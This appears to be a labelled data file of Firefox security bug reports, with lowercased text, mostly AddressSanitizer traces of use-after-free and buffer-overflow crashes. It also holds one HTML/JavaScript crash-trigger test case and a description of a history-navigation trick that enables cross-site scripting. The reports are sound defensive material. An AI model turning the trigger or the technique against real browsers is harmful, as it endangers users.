heap-use-after-free in nshtmleditrules deletenontableelements reproduces on trunk my repro is ugly but reproduces reliably on my local machine i will attach something here once i get a better minimized repro i debugged and didnt see a reason to wait for filing some of the stack frames are missing b/w 0 and 1 since this is an optimized build but getprevioussibling in 0 see nshtmleditrules deletenontableelements tells that the stale child is being accessed it looks like raw ptr issue probably coming from l1.85 when i changed to nscomptr and recompiled crash stopped 19766 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 0 in nsinode getprevioussibling const firefox/src/modules/zlib/src/inffast.c:0 1 in nshtmleditrules willdoaction mozilla selection nsrulesinfo bool bool firefox/src/editor/libeditor/html/nshtmleditrules.cpp:577 2 in nsplaintexteditor deleteselection short short firefox/src/editor/libeditor/text/nsplaintexteditor.cpp:657 3 in nshtmleditrules willinserttext nseditor operationid mozilla selection bool bool nsastring_internal const nsastring_internal int firefox/src/editor/libeditor/html/nshtmleditrules.cpp:1260 4 in nshtmleditrules willdoaction mozilla selection nsrulesinfo bool bool firefox/src/editor/libeditor/html/nshtmleditrules.cpp:570 5 in nsplaintexteditor inserttext nsastring_internal const firefox/src/editor/libeditor/text/nsplaintexteditor.cpp:700 6 in nsinsertplaintextcommand docommandparams char const nsicommandparams nsisupports firefox/src/editor/libeditor/base/nseditorcommands.cpp:834 7 in nscontrollercommandtable docommandparams char const nsicommandparams nsisupports firefox/src/embedding/components/commandhandler/src/nscontrollercommandtable.cpp:175 8 in nsbasecommandcontroller docommandwithparams char const nsicommandparams firefox/src/embedding/components/commandhandler/src/nsbasecommandcontroller.cpp:153 9 in nscommandmanager docommand char const nsicommandparams nsidomwindow firefox/src/embedding/components/commandhandler/src/nscommandmanager.cpp:238 10 in nshtmldocument execcommand nsastring_internal const bool nsastring_internal const bool firefox/src/content/html/document/src/nshtmldocument.cpp:3218 11 in ns_invokebyindex_p firefox/src/xpcom/reflect/xptcall/src/md/unix/xptcinvoke_x86_64_unix.cpp:164 12 in callmethodhelper invoke firefox/src/js/xpconnect/src/xpcwrappednative.cpp:3071 13 in xpc_wn_callmethod jscontext unsigned int js value firefox/src/js/xpconnect/src/xpcwrappednativejsops.cpp:1474 14 in js invokekernel jscontext js callargs js maybeconstruct firefox/src/js/src/jscntxtinlines.h:400 15 in js interpret jscontext js stackframe js interpmode firefox/src/js/src/jsinterp.cpp:2465 16 in js runscript jscontext jsscript js stackframe firefox/src/js/src/jsinterp.cpp:299 17 in js executekernel jscontext jsscript jsobject js value const js executetype js stackframe js value firefox/src/js/src/jsinterp.cpp:482 18 in js execute jscontext jsscript jsobject js value firefox/src/js/src/jsinterp.cpp:519 19 in evaluateucscriptforprincipalscommon jscontext jsobject jsprincipals jsprincipals unsigned short const unsigned int char const unsigned int js value jsversion firefox/src/js/src/jsapi.cpp:5370 20 in js_evaluateucscriptforprincipalsversionorigin firefox/src/js/src/jsapi.cpp:5407 21 in nsjscontext evaluatestring nsastring_internal const jsobject nsiprincipal nsiprincipal char const unsigned int jsversion nsastring_internal bool firefox/src/dom/base/nsjsenvironment.cpp:1466 22 in nsglobalwindow runtimeouthandler nstimeout nsiscriptcontext firefox/src/dom/base/nsglobalwindow.cpp:9519 23 in nsglobalwindow runtimeout nstimeout firefox/src/dom/base/nsglobalwindow.cpp:9783 24 in nsglobalwindow timercallback nsitimer void firefox/src/dom/base/nsglobalwindow.cpp:10055 25 in nstimerimpl fire firefox/src/xpcom/threads/nstimerimpl.cpp:473 26 in nstimerevent run firefox/src/xpcom/threads/nstimerimpl.cpp:559 27 in nsthread processnextevent bool bool firefox/src/xpcom/threads/nsthread.cpp:624 28 in ns_processnextevent_p nsithread bool firefox/src/objdir-ff-asan/xpcom/build/nsthreadutils.cpp:217 29 in mozilla ipc messagepump run base messagepump delegate firefox/src/ipc/glue/messagepump.cpp:82 30 in messageloop run firefox/src/ipc/chromium/src/base/message_loop.cc:176 31 in nsbaseappshell run firefox/src/widget/xpwidgets/nsbaseappshell.cpp:165 32 in xremain xre_main int char nsxreappdata const firefox/src/toolkit/xre/nsapprunner.cpp:3864 33 in xre_main firefox/src/toolkit/xre/nsapprunner.cpp:3940 34 in do_main int char firefox/src/browser/app/nsbrowserapp.cpp:160 35 in main firefox/src/browser/app/nsbrowserapp.cpp:330 36 in 0 is located 56 bytes inside of 120-byte region freed by thread t0 here 0 in free 0 1 in nsnodeutils lastrelease nsinode firefox/src/content/base/src/nsnodeutils.cpp:252 2 in nsgenericdomdatanode release firefox/src/content/base/src/nsgenericdomdatanode.cpp:113 3 in nshtmleditrules deletenontableelements nsinode firefox/src/editor/libeditor/html/nshtmleditrules.cpp:2824 4 in nshtmleditrules willdoaction mozilla selection nsrulesinfo bool bool firefox/src/editor/libeditor/html/nshtmleditrules.cpp:577 5 in nsplaintexteditor deleteselection short short firefox/src/editor/libeditor/text/nsplaintexteditor.cpp:657 6 in nshtmleditrules willinserttext nseditor operationid mozilla selection bool bool nsastring_internal const nsastring_internal int firefox/src/editor/libeditor/html/nshtmleditrules.cpp:1260 7 in nshtmleditrules willdoaction mozilla selection nsrulesinfo bool bool firefox/src/editor/libeditor/html/nshtmleditrules.cpp:570 8 in nsplaintexteditor inserttext nsastring_internal const firefox/src/editor/libeditor/text/nsplaintexteditor.cpp:700 9 in nsinsertplaintextcommand docommandparams char const nsicommandparams nsisupports firefox/src/editor/libeditor/base/nseditorcommands.cpp:834 10 in nscontrollercommandtable docommandparams char const nsicommandparams nsisupports firefox/src/embedding/components/commandhandler/src/nscontrollercommandtable.cpp:175 11 in nsbasecommandcontroller docommandwithparams char const nsicommandparams firefox/src/embedding/components/commandhandler/src/nsbasecommandcontroller.cpp:153 12 in nscommandmanager docommand char const nsicommandparams nsidomwindow firefox/src/embedding/components/commandhandler/src/nscommandmanager.cpp:238 13 in nshtmldocument execcommand nsastring_internal const bool nsastring_internal const bool firefox/src/content/html/document/src/nshtmldocument.cpp:3218 14 in ns_invokebyindex_p firefox/src/xpcom/reflect/xptcall/src/md/unix/xptcinvoke_x86_64_unix.cpp:164 15 in callmethodhelper invoke firefox/src/js/xpconnect/src/xpcwrappednative.cpp:3071 16 in xpc_wn_callmethod jscontext unsigned int js value firefox/src/js/xpconnect/src/xpcwrappednativejsops.cpp:1474 17 in js invokekernel jscontext js callargs js maybeconstruct firefox/src/js/src/jscntxtinlines.h:400 18 in js interpret jscontext js stackframe js interpmode firefox/src/js/src/jsinterp.cpp:2465 19 in js runscript jscontext jsscript js stackframe firefox/src/js/src/jsinterp.cpp:299 20 in js executekernel jscontext jsscript jsobject js value const js executetype js stackframe js value firefox/src/js/src/jsinterp.cpp:482 21 in js execute jscontext jsscript jsobject js value firefox/src/js/src/jsinterp.cpp:519 22 in evaluateucscriptforprincipalscommon jscontext jsobject jsprincipals jsprincipals unsigned short const unsigned int char const unsigned int js value jsversion firefox/src/js/src/jsapi.cpp:5370 23 in js_evaluateucscriptforprincipalsversionorigin firefox/src/js/src/jsapi.cpp:5407 24 in nsjscontext evaluatestring nsastring_internal const jsobject nsiprincipal nsiprincipal char const unsigned int jsversion nsastring_internal bool firefox/src/dom/base/nsjsenvironment.cpp:1466 25 in nsglobalwindow runtimeouthandler nstimeout nsiscriptcontext firefox/src/dom/base/nsglobalwindow.cpp:9519 26 in nsglobalwindow runtimeout nstimeout firefox/src/dom/base/nsglobalwindow.cpp:9783 27 in nsglobalwindow timercallback nsitimer void firefox/src/dom/base/nsglobalwindow.cpp:10055 28 in nstimerimpl fire firefox/src/xpcom/threads/nstimerimpl.cpp:473 29 in nstimerevent run firefox/src/xpcom/threads/nstimerimpl.cpp:559 previously allocated by thread t0 here 0 in interceptor_malloc 0 1 in moz_xmalloc firefox/src/memory/mozalloc/mozalloc.cpp:54 2 in nscontentutils setnodetextcontent nsicontent nsastring_internal const bool firefox/src/content/base/src/nscontentutils.cpp:4310 3 in nsidomnode_settextcontent jscontext js handle jsobject js handle long int js value firefox/src/objdir-ff-asan/js/xpconnect/src/dom_quickstubs.cpp:5665 4 in js calljspropertyopsetter jscontext int jscontext js handle jsobject js handle long int js value js handle jsobject js handle long int js value firefox/src/js/src/jscntxtinlines.h:460 5 in js baseops setpropertyhelper jscontext js handle jsobject js handle jsobject js handle long unsigned int js value int firefox/src/js/src/jsobj.cpp:4924 6 in js setpropertyoperation jscontext unsigned char js value const js value const firefox/src/js/src/jsinterpinlines.h:353 7 in js interpret jscontext js stackframe js interpmode firefox/src/js/src/jsinterp.cpp:2378 8 in js runscript jscontext jsscript js stackframe firefox/src/js/src/jsinterp.cpp:299 9 in js executekernel jscontext jsscript jsobject js value const js executetype js stackframe js value firefox/src/js/src/jsinterp.cpp:482 10 in js execute jscontext jsscript jsobject js value firefox/src/js/src/jsinterp.cpp:519 11 in evaluateucscriptforprincipalscommon jscontext jsobject jsprincipals jsprincipals unsigned short const unsigned int char const unsigned int js value jsversion firefox/src/js/src/jsapi.cpp:5370 12 in js_evaluateucscriptforprincipalsversionorigin firefox/src/js/src/jsapi.cpp:5407 13 in nsjscontext evaluatestring nsastring_internal const jsobject nsiprincipal nsiprincipal char const unsigned int jsversion nsastring_internal bool firefox/src/dom/base/nsjsenvironment.cpp:1466 14 in nsglobalwindow runtimeouthandler nstimeout nsiscriptcontext firefox/src/dom/base/nsglobalwindow.cpp:9519 15 in nsglobalwindow runtimeout nstimeout firefox/src/dom/base/nsglobalwindow.cpp:9783 16 in nsglobalwindow timercallback nsitimer void firefox/src/dom/base/nsglobalwindow.cpp:10055 17 in nstimerimpl fire firefox/src/xpcom/threads/nstimerimpl.cpp:473 18 in nstimerevent run firefox/src/xpcom/threads/nstimerimpl.cpp:559 19 in nsthread processnextevent bool bool firefox/src/xpcom/threads/nsthread.cpp:624 20 in ns_processnextevent_p nsithread bool firefox/src/objdir-ff-asan/xpcom/build/nsthreadutils.cpp:217 21 in mozilla ipc messagepump run base messagepump delegate firefox/src/ipc/glue/messagepump.cpp:82 22 in messageloop run firefox/src/ipc/chromium/src/base/message_loop.cc:176 23 in nsbaseappshell run firefox/src/widget/xpwidgets/nsbaseappshell.cpp:165 24 in xremain xre_main int char nsxreappdata const firefox/src/toolkit/xre/nsapprunner.cpp:3864 19766 aborting stats 254m malloced 344m for red zones by 1006225 calls stats 61m realloced by 90383 calls stats 199m freed by 740263 calls stats 96m really freed by 201732 calls stats 528m 135231 full pages mmaped in 132 calls mmaps by size class 8:704469 9:81910 10:24570 11:20470 12:5120 13:4608 14:1792 15:512 16:640 17:160 18:208 19:48 20:16 mallocs by size class 8:829738 9:109453 10:28229 11:24936 12:5172 13:4924 14:2120 15:516 16:683 17:171 18:222 19:45 20:16 frees by size class 8:588569 9:95710 10:23943 11:20926 12:3996 13:3894 14:1904 15:444 16:595 17:151 18:78 19:40 20:13 rfrees by size class 8:144710 9:31877 10:10454 11:10832 12:1184 13:698 14:1154 15:224 16:419 17:82 18:51 19:37 20:10 stats malloc large 454 small slow 3904 shadow byte and word fd fd fd fd fd fd fd fd fd more shadow bytes 00 00 00 fb fb fb fb fb fb fb fb fb fb fb fb fb fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd	11
heap-buffer-overflow in nsblockframe marklinedirty reproduces on trunk 25348 error addresssanitizer heap-buffer-overflow on address at pc bp sp read of size 4 at thread t0 0 in nslinebox isinline const asn1cmn.c:0 1 in nsblockframe marklinedirty nslinelist_iterator nslinelist const layout/generic/nsblockframe.cpp:1562 2 in nsblockframe addframes nsframelist nsiframe layout/generic/nsblockframe.cpp:4990 3 in nsblockframe insertframes mozilla layout framechildlistid nsiframe nsframelist layout/generic/nsblockframe.cpp:4838 4 in nsframemanager insertframes nsiframe mozilla layout framechildlistid nsiframe nsframelist layout/base/nsframemanager.cpp:463 5 in nscssframeconstructor contentrangeinserted nsicontent nsicontent nsicontent nsilayouthistorystate bool layout/base/nscssframeconstructor.cpp:7332 6 in nscssframeconstructor contentinserted nsicontent nsicontent nsilayouthistorystate bool layout/base/nscssframeconstructor.cpp:6814 7 in nscssframeconstructor recreateframesforcontent nsicontent bool layout/base/nscssframeconstructor.cpp:9263 8 in nscssframeconstructor processrestyledframes nsstylechangelist layout/base/nscssframeconstructor.cpp:8008 9 in nscssframeconstructor restyleelement mozilla dom element nsiframe nschangehint mozilla css restyletracker bool layout/base/nscssframeconstructor.cpp:8162 10 in mozilla css restyletracker processonerestyle mozilla dom element nsrestylehint nschangehint layout/base/restyletracker.cpp:125 11 in mozilla css restyletracker doprocessrestyles layout/base/restyletracker.cpp:210 12 in mozilla css restyletracker processrestyles layout/base/restyletracker.h:70 13 in nscssframeconstructor processpendingrestyles layout/base/nscssframeconstructor.cpp:11996 14 in presshell flushpendingnotifications mozflushtype layout/base/nspresshell.cpp:3814 15 in nsgfxscrollframeinner asyncscrollportevent run layout/generic/nsgfxscrollframe.cpp:2990 16 in nsrootprescontext flushwillpaintobservers layout/base/nsprescontext.cpp:2807 17 in nsrootprescontext runwillpaintobservers run layout/base/nsprescontext.h:1381 18 in nsthread processnextevent bool bool xpcom/threads/nsthread.cpp:625 19 in ns_processnextevent_p nsithread bool objdir-ff-asan-sym/xpcom/build/nsthreadutils.cpp:217 20 in mozilla ipc messagepump run base messagepump delegate ipc/glue/messagepump.cpp:82 21 in messageloop runinternal ipc/chromium/src/base/message_loop.cc:209 22 in messageloop runhandler ipc/chromium/src/base/message_loop.cc:202 23 in messageloop run ipc/chromium/src/base/message_loop.cc:176 24 in nsbaseappshell run widget/xpwidgets/nsbaseappshell.cpp:165 25 in nsappstartup run toolkit/components/startup/nsappstartup.cpp:257 26 in xremain xre_mainrun toolkit/xre/nsapprunner.cpp:3787 27 in xremain xre_main int char nsxreappdata const toolkit/xre/nsapprunner.cpp:3864 28 in xre_main toolkit/xre/nsapprunner.cpp:3940 29 in do_main int char browser/app/nsbrowserapp.cpp:160 30 in main browser/app/nsbrowserapp.cpp:298 31 in 0 is located 20 bytes to the right of 32-byte region allocated by thread t0 here 0 in interceptor_malloc 0 1 in moz_xmalloc memory/mozalloc/mozalloc.cpp:54 2 in nsblockframe pushlines nsblockreflowstate nslinelist_iterator layout/generic/nsblockframe.cpp:4414 3 in nsblockframe placeline nsblockreflowstate nslinelayout nslinelist_iterator nsfloatmanager savedstate nsrect int bool layout/generic/nsblockframe.cpp:4325 4 in nsblockframe doreflowinlineframes nsblockreflowstate nslinelayout nslinelist_iterator nsflowarearect int nsfloatmanager savedstate bool linereflowstatus bool layout/generic/nsblockframe.cpp:3764 5 in nsblockframe reflowinlineframes nsblockreflowstate nslinelist_iterator bool layout/generic/nsblockframe.cpp:3482 6 in nsblockframe reflowline nsblockreflowstate nslinelist_iterator bool layout/generic/nsblockframe.cpp:2570 7 in nsblockframe reflowdirtylines nsblockreflowstate layout/generic/nsblockframe.cpp:2020 8 in nsblockframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int layout/generic/nsblockframe.cpp:1069 9 in nscontainerframe reflowchild nsiframe nsprescontext nshtmlreflowmetrics nshtmlreflowstate const int int unsigned int unsigned int nsoverflowcontinuationtracker layout/generic/nscontainerframe.cpp:906 10 in nscolumnsetframe reflowchildren nshtmlreflowmetrics nshtmlreflowstate const unsigned int nscolumnsetframe reflowconfig const bool nscollapsingmargin nscolumnsetframe columnbalancedata layout/generic/nscolumnsetframe.cpp:665 11 in nscolumnsetframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int layout/generic/nscolumnsetframe.cpp:920 12 in nsblockreflowcontext reflowblock nsrect const bool nscollapsingmargin int bool nslinebox nshtmlreflowstate unsigned int nsblockreflowstate layout/generic/nsblockreflowcontext.cpp:262 13 in nsblockframe reflowblockframe nsblockreflowstate nslinelist_iterator bool layout/generic/nsblockframe.cpp:3206 14 in nsblockframe reflowline nsblockreflowstate nslinelist_iterator bool layout/generic/nsblockframe.cpp:2514 15 in nsblockframe reflowdirtylines nsblockreflowstate layout/generic/nsblockframe.cpp:2020 16 in nsblockframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int layout/generic/nsblockframe.cpp:1069 17 in nscontainerframe reflowchild nsiframe nsprescontext nshtmlreflowmetrics nshtmlreflowstate const int int unsigned int unsigned int nsoverflowcontinuationtracker layout/generic/nscontainerframe.cpp:906 18 in nscolumnsetframe reflowchildren nshtmlreflowmetrics nshtmlreflowstate const unsigned int nscolumnsetframe reflowconfig const bool nscollapsingmargin nscolumnsetframe columnbalancedata layout/generic/nscolumnsetframe.cpp:665 19 in nscolumnsetframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int layout/generic/nscolumnsetframe.cpp:920 20 in nscontainerframe reflowchild nsiframe nsprescontext nshtmlreflowmetrics nshtmlreflowstate const int int unsigned int unsigned int nsoverflowcontinuationtracker layout/generic/nscontainerframe.cpp:906 21 in nscanvasframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int layout/generic/nscanvasframe.cpp:429 22 in nscontainerframe reflowchild nsiframe nsprescontext nshtmlreflowmetrics nshtmlreflowstate const int int unsigned int unsigned int nsoverflowcontinuationtracker layout/generic/nscontainerframe.cpp:906 23 in nshtmlscrollframe reflowscrolledframe scrollreflowstate bool bool nshtmlreflowmetrics bool layout/generic/nsgfxscrollframe.cpp:518 24 in nshtmlscrollframe trylayout scrollreflowstate nshtmlreflowmetrics bool bool bool unsigned int layout/generic/nsgfxscrollframe.cpp:363 25348 aborting stats 152m malloced 168m for red zones by 363291 calls stats 39m realloced by 19415 calls stats 109m freed by 231030 calls stats 0m really freed by 0 calls stats 344m 88112 full pages mmaped in 86 calls mmaps by size class 8:294894 9:49146 10:20475 11:18423 12:3072 13:2048 14:1536 15:384 16:576 17:128 18:176 19:40 20:12 mallocs by size class 8:274461 9:47542 10:16571 11:17710 12:2504 13:1857 14:1429 15:321 16:571 17:101 18:172 19:40 20:12 frees by size class 8:162364 9:36580 10:13056 11:14376 12:1553 13:942 14:1230 15:269 16:470 17:91 18:52 19:38 20:9 rfrees by size class stats malloc large 325 small slow 1903 shadow byte and word fb 00 00 00 00 fb fb fb fb more shadow bytes fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 00 00 00 00 fb fb fb fb fb fb fb fb fb fb fb fb fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00	11
heap-use-after-free in mediastreamgraphthreadrunnable run reproduces on trunk but no reliable testcase looks like a race condition free and read stacks on different threads 23547 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t26 0 in nstarray_base nstarraydefaultallocator length const dist/include/nstarray.h:192 1 in mozilla anonymous namespace mediastreamgraphthreadrunnable run content/media/mediastreamgraph.cpp:1418 2 in ns_processnextevent_p nsithread bool obj-firefox/xpcom/build/nsthreadutils.cpp:217 3 in nsthread shuttingdown xpcom/threads/nsthread.h:58 4 in pt_root nsprpub/pr/src/pthreads/ptthread.c:159 5 in asan asanthread threadstart is located 24 bytes inside of 160-byte region freed by thread t0 here 0 in free 1 in mozilla anonymous namespace mediastreamgraphshutdownrunnable run dist/include/mozilla/mozalloc.h:224 2 in ns_processnextevent_p nsithread bool obj-firefox/xpcom/build/nsthreadutils.cpp:217 3 in mozilla ipc messagepump run base messagepump delegate ipc/glue/messagepump.cpp:82 4 in autorunstate ipc/chromium/src/base/message_loop.cc:495 5 in nsbaseappshell run widget/xpwidgets/nsbaseappshell.cpp:165 6 in xremain xre_main int char nsxreappdata const toolkit/xre/nsapprunner.cpp:3864 7 in xre_main toolkit/xre/nsapprunner.cpp:3940 8 in do_main int char browser/app/nsbrowserapp.cpp:160 9 in libc_start_main build/buildd/eglibc-2.11.1/csu/libc-start.c:258 previously allocated by thread t0 here 0 in interceptor_malloc 1 in moz_xmalloc memory/mozalloc/mozalloc.cpp:54 thread t26 created by t0 here 0 in pthread_create 1 in pr_createthread nsprpub/pr/src/pthreads/ptthread.c:393 2 in pr_createthread nsprpub/pr/src/pthreads/ptthread.c:476 23547 aborting stats 224m malloced 246m for red zones by 555057 calls stats 63m realloced by 26859 calls stats 192m freed by 304029 calls stats 56m really freed by 87570 calls stats 452m 115781 full pages mmaped in 113 calls mmaps by size class 8:409575 9:57337 10:20475 11:14329 12:5120 13:3584 14:1792 15:384 16:704 17:128 18:352 19:48 20:16 mallocs by size class 8:448948 9:58529 10:19258 11:15813 12:5297 13:3626 14:1808 15:460 16:754 17:148 18:356 19:46 20:14 frees by size class 8:221668 9:43579 10:15245 11:12709 12:4297 13:3356 14:1570 15:403 16:678 17:129 18:341 19:42 20:12 rfrees by size class 8:59999 9:12785 10:4920 11:6721 12:899 13:593 14:1049 15:151 16:365 17:44 18:27 19:16 20:1 stats malloc large 564 small slow 2703 shadow byte and word fd fd fd fd fd fd fd fd fd more shadow bytes fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa	11
history state error with late navigation involving a hash change docshell is still vulnerable to the history state issue described in bug 757376 if the write to location.hash is substituted for a history navigation involving a hash change suppose the history object is in the following state 0 1 hash active 2 calling history.forward and history.back in a rapid succession will cause the targeted website to load into the existing session history entry 0 0 active 1 hash 2 a subsequent call to history.forward changes baseuri which allows the attacker to inject a script loaded from a relative path xss or intercept data posted to a location specified with a relative path	11
use-after-free when loading html file on osx user agent mozilla/5.0 macintosh intel mac os x 10_7_4 applewebkit/536.11 khtml like gecko chrome/20.0.1132.57 safari/536.11 steps to reproduce loaded html head style el0 moz-perspective 1px el1 moz-transform rotatey 1deg el2 width 40000 style script onload function el0=document.createelement div el0.setattribute id el0 document.body.appendchild el0 el1=document.createelement tr el1.setattribute id el1 el0.appendchild el1 el2=document.createelement input el2.setattribute id el2 el1.appendchild el2 document.body.offsettop settimeout function window.open document.location 2000 script head body body html actual results asan said 18953 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 0 in zn7mozilla6layersl15pixmantransformepk15gfximagesurfaces3_rk11gfx3dmatrix8gfxpoint in xul 764 1 in zn7mozilla6layersl11transform3dep11gfxasurfacep10gfxcontextrk7gfxrectrk11gfx3dmatrixr8gfxpointb in xul 1990 2 in mozilla layers basiclayermanager paintlayer gfxcontext mozilla layers layer void mozilla layers thebeslayer gfxcontext nsintregion const nsintregion const void void mozilla layers readbackprocessor in xul 5254 3 in mozilla layers basiclayermanager paintlayer gfxcontext mozilla layers layer void is located 0 bytes inside of 72-byte region freed by thread t0 here 0 in anonymous namespace mz_free malloc_zone_t void in firefox 85 1 in wrap_free in firefox 80 2 in gfxasurface release in xul 310 3 in gfxquartzsurface getasimagesurface in xul 343 4 in expected results d	11
heap-use-after-free in nshtmlselectelement submitnamesvalues reproduces on trunk repro reproduced once but got it under a fully symbolized build as i have a better testcase i will add it here 2410 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 0 in nshtmlselectelement submitnamesvalues nsformsubmission src/content/html/content/src/nshtmlselectelement.cpp:1747 1 in non-virtual thunk to nshtmlselectelement submitnamesvalues nsformsubmission asn1cmn.c:0 2 in nshtmlformelement walkformelements nsformsubmission src/content/html/content/src/nshtmlformelement.cpp:983 3 in nshtmlformelement buildsubmission nsformsubmission nsevent src/content/html/content/src/nshtmlformelement.cpp:772 4 in nshtmlformelement dosubmit nsevent src/content/html/content/src/nshtmlformelement.cpp:706 5 in nshtmlformelement dosubmitorreset nsevent int src/content/html/content/src/nshtmlformelement.cpp:657 6 in nshtmlformelement submit src/content/html/content/src/nshtmlformelement.cpp:391 7 in non-virtual thunk to nshtmlformelement submit asn1cmn.c:0 8 in nsidomhtmlformelement_submit jscontext unsigned int js value src/objdir-ff-asan-sym/js/xpconnect/src/dom_quickstubs.cpp:14382 9 in js calljsnative jscontext int jscontext unsigned int js value js callargs const src/js/src/jscntxtinlines.h:382 10 in js interpret jscontext js stackframe js interpmode src/js/src/jsinterp.cpp:2426 11 in js runscript jscontext jsscript js stackframe src/js/src/jsinterp.cpp:302 12 in js invokekernel jscontext js callargs js maybeconstruct src/js/src/jsinterp.cpp:356 13 in js invoke jscontext js invokeargsguard js maybeconstruct src/js/src/jsinterp.h:119 14 in js invoke jscontext js value const js value const unsigned int js value js value src/js/src/jsinterp.cpp:388 15 in js_callfunctionvalue src/js/src/jsapi.cpp:5572 16 in nsjscontext calleventhandler nsisupports jsobject jsobject nsiarray nsivariant src/dom/base/nsjsenvironment.cpp:1891 17 in nsjseventlistener handleevent nsidomevent src/dom/src/events/nsjseventlistener.cpp:188 18 in nseventlistenermanager handleeventsubtype nslistenerstruct nsidomeventlistener nsidomevent nsidomeventtarget unsigned int nscxpusher src/content/events/src/nseventlistenermanager.cpp:794 19 in nseventlistenermanager handleeventinternal nsprescontext nsevent nsidomevent nsidomeventtarget unsigned int nseventstatus nscxpusher src/content/events/src/nseventlistenermanager.cpp:867 20 in nseventlistenermanager handleevent nsprescontext nsevent nsidomevent nsidomeventtarget unsigned int nseventstatus nscxpusher src/content/events/src/nseventlistenermanager.h:144 21 in nseventtargetchainitem handleevent nseventchainpostvisitor unsigned int bool nscxpusher src/content/events/src/nseventdispatcher.cpp:185 22 in nseventtargetchainitem handleeventtargetchain nseventchainpostvisitor unsigned int nsdispatchingcallback bool nscxpusher src/content/events/src/nseventdispatcher.cpp:313 23 in nseventdispatcher dispatch nsisupports nsprescontext nsevent nsidomevent nseventstatus nsdispatchingcallback nscomarray nsidomeventtarget src/content/events/src/nseventdispatcher.cpp:634 24 in documentviewerimpl loadcomplete unsigned int src/layout/base/nsdocumentviewer.cpp:1017 25 in nsdocshell endpageload nsiwebprogress nsichannel unsigned int src/docshell/base/nsdocshell.cpp:6294 26 in nsdocshell onstatechange nsiwebprogress nsirequest unsigned int unsigned int src/docshell/base/nsdocshell.cpp:6125 27 in non-virtual thunk to nsdocshell onstatechange nsiwebprogress nsirequest unsigned int unsigned int asn1cmn.c:0 28 in nsdocloader dofireonstatechange nsiwebprogress nsirequest int unsigned int src/uriloader/base/nsdocloader.cpp:1352 29 in nsdocloader dostopdocumentload nsirequest unsigned int src/uriloader/base/nsdocloader.cpp:930 30 in nsdocloader docloaderisempty bool src/uriloader/base/nsdocloader.cpp:822 31 in nsdocloader onstoprequest nsirequest nsisupports unsigned int src/uriloader/base/nsdocloader.cpp:704 32 in non-virtual thunk to nsdocloader onstoprequest nsirequest nsisupports unsigned int asn1cmn.c:0 33 in nsloadgroup removerequest nsirequest nsisupports unsigned int src/netwerk/base/src/nsloadgroup.cpp:698 34 in nsdocument dounblockonload src/content/base/src/nsdocument.cpp:7189 35 in nsdocument unblockonload bool src/content/base/src/nsdocument.cpp:7132 36 in nsbindingmanager doprocessattachedqueue src/content/xbl/src/nsbindingmanager.cpp:990 37 in nsrunnablemethodimpl void nsbindingmanager true run src dist/include/nsthreadutils.h:349 38 in nsthread processnextevent bool bool src/xpcom/threads/nsthread.cpp:625 39 in ns_processnextevent_p nsithread bool src/objdir-ff-asan-sym/xpcom/build/nsthreadutils.cpp:217 40 in mozilla ipc messagepump run base messagepump delegate src/ipc/glue/messagepump.cpp:82 41 in messageloop runinternal src/ipc/chromium/src/base/message_loop.cc:209 42 in messageloop runhandler src/ipc/chromium/src/base/message_loop.cc:202 43 in messageloop run src/ipc/chromium/src/base/message_loop.cc:176 44 in nsbaseappshell run src/widget/xpwidgets/nsbaseappshell.cpp:165 45 in nsappstartup run src/toolkit/components/startup/nsappstartup.cpp:257 46 in xremain xre_mainrun src/toolkit/xre/nsapprunner.cpp:3787 47 in xremain xre_main int char nsxreappdata const src/toolkit/xre/nsapprunner.cpp:3864 48 in xre_main src/toolkit/xre/nsapprunner.cpp:3940 49 in do_main int char src/browser/app/nsbrowserapp.cpp:160 50 in main src/browser/app/nsbrowserapp.cpp:298 51 in 0 is located 0 bytes inside of 232-byte region freed by thread t0 here 0 in free 0 1 in moz_free src/memory/mozalloc/mozalloc.cpp:49 2 in nshtmlselectelement src/content/html/content/src/nshtmlselectelement.cpp:134 3 in nsnodeutils lastrelease nsinode src/content/base/src/nsnodeutils.cpp:252 4 in nsgenericelement release src/content/base/src/nsgenericelement.cpp:3509 5 in nshtmlselectelement release src/content/html/content/src/nshtmlselectelement.cpp:146 6 in nsxpcomcyclecollectionparticipant unrootimpl void src/objdir-ff-asan-sym/xpcom/build/nscyclecollectionparticipant.cpp:37 7 in nscyclecollector collectwhite nsicyclecollectorlistener src/xpcom/base/nscyclecollector.cpp:2305 8 in nscyclecollector finishcollection nsicyclecollectorlistener src/xpcom/base/nscyclecollector.cpp:2845 9 in nscyclecollectorrunner collect bool nscyclecollectorresults nsicyclecollectorlistener src/xpcom/base/nscyclecollector.cpp:3147 10 in nscyclecollector_collect bool nscyclecollectorresults nsicyclecollectorlistener src/xpcom/base/nscyclecollector.cpp:3236 11 in nsjscontext cyclecollectnow nsicyclecollectorlistener int bool src/dom/base/nsjsenvironment.cpp:3072 12 in cctimerfired nsitimer void src/dom/base/nsjsenvironment.cpp:3263 13 in nstimerimpl fire src/xpcom/threads/nstimerimpl.cpp:474 14 in nstimerevent run src/xpcom/threads/nstimerimpl.cpp:558 15 in nsthread processnextevent bool bool src/xpcom/threads/nsthread.cpp:625 16 in ns_processnextevent_p nsithread bool src/objdir-ff-asan-sym/xpcom/build/nsthreadutils.cpp:217 17 in nsxulwindow showmodal src/xpfe/appshell/src/nsxulwindow.cpp:378 18 in nscontenttreeowner 